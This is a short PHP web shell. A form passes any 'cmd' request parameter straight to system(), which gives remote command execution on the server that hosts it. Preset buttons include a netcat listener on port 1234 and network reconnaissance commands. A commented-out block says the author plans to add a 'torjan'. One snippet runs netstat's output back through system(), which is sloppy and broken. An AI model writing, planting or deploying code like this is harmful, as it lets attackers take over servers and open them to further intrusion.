<center><form method="get" action="">
<input type="submit" name="cmd" value="nc -v -n -l -p 1234">
<input type="submit" name="cmd" value="ipconfig">
<input type="submit" name="cmd" value="ifconfig">
<input type="submit" name="cmd" value="netstat -a">
</form>
<?php
$cmd=$_GET['cmd'];
system($cmd);
?>
<?php
$hello = exec("netstat -a");
system($hello)
?>




<!--
i will up thi script after add the torjan h in the list 
<center>
  <form method="POST" action="">
    <input type="submit" name="cmd1" value="nc -v -n -l -p 1234">
    <input type="submit" name="cmd2" value="ipconfig">
    <input type="submit" name="cmd3" value="ifconfig">
    <input type="submit" name="cmd4" value="netstat -a">
  </form>
<?php
/*if ($_SERVER['REQUEST_METHOD'] == "POST") {
  !($_POST['cmd1']) ?: $cmd = "nc -v -n -l -p 1234";
  !($_POST['cmd2']) ?: $cmd = "ipconfig";
  !($_POST['cmd3']) ?: $cmd = "ifconfig";
  !($_POST['cmd4']) ?: $cmd = "netstat -a";
  $output = shell_exec($cmd . " 2>&1");
  echo $output;
}
*/?>
</center>
-->
